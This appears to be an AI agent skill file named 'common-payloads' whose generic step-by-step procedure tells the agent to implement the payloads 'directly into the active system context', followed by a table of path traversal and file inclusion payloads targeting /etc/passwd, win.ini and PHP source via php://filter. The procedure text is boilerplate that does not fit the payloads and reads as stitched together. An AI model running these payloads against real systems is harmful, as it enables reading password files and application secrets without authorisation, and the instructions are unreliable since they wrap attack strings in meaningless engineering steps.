---
name: common-payloads
description: Use when executing common payloads protocols within the engineering sector.
---

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core common payloads logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the engineering sector.

---

## 📚 Reference Material

# Common Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code |